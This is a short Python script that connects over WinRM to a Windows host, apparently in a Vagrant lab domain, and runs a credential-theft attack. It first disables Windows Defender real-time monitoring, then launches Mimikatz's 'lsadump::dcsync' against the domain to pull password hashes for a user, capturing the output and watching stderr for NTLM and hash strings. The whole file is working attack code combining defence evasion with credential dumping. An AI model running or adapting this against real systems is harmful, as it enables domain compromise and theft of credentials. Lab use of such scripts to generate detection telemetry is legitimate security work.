"""Run Mimikatz DCSync via WinRM using Start-Process with output capture."""
import winrm, datetime

HOST = '192.168.50.17'
USER = 'vagrant'
PASS = 'vagrant'

s = winrm.Session(HOST, auth=(USER, PASS), transport='ntlm')

# Disable Defender first
r = s.run_ps('Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue')
print("Defender:", r.std_out.decode().strip())

ts = datetime.datetime.now(datetime.UTC)
print(f"TIMESTAMP: {ts.strftime('%Y-%m-%dT%H:%M:%S')}Z")

# Run Mimikatz directly with Start-Process
ps = r'''
$mimi = "C:\Users\vagrant\Desktop\mimikatz\x64\mimikatz.exe"
$args = '"lsadump::dcsync /domain:windomain2025.local /user:vagrant" exit'
$p = Start-Process -FilePath $mimi -ArgumentList $args -NoNewWindow -Wait -PassThru -RedirectStandardOutput C:\Users\vagrant\Desktop\mimi_out2.txt -RedirectStandardError C:\Users\vagrant\Desktop\mimi_err2.txt
Write-Host "Exit code: $($p.ExitCode)"
Start-Sleep 2
if (Test-Path C:\Users\vagrant\Desktop\mimi_out2.txt) {
    Get-Content C:\Users\vagrant\Desktop\mimi_out2.txt
}
if (Test-Path C:\Users\vagrant\Desktop\mimi_err2.txt) {
    Write-Host "---STDERR---"
    Get-Content C:\Users\vagrant\Desktop\mimi_err2.txt
}
'''
r = s.run_ps(ps)
print(r.std_out.decode())
if r.std_err:
    err = r.std_err.decode()
    if 'mimi_out2' in err.lower() or 'mimi_err2' in err.lower() or 'lsadump' in err.lower() or 'NTLM' in err or 'Hash' in err:
        print("STDERR (relevant):", err[:500])
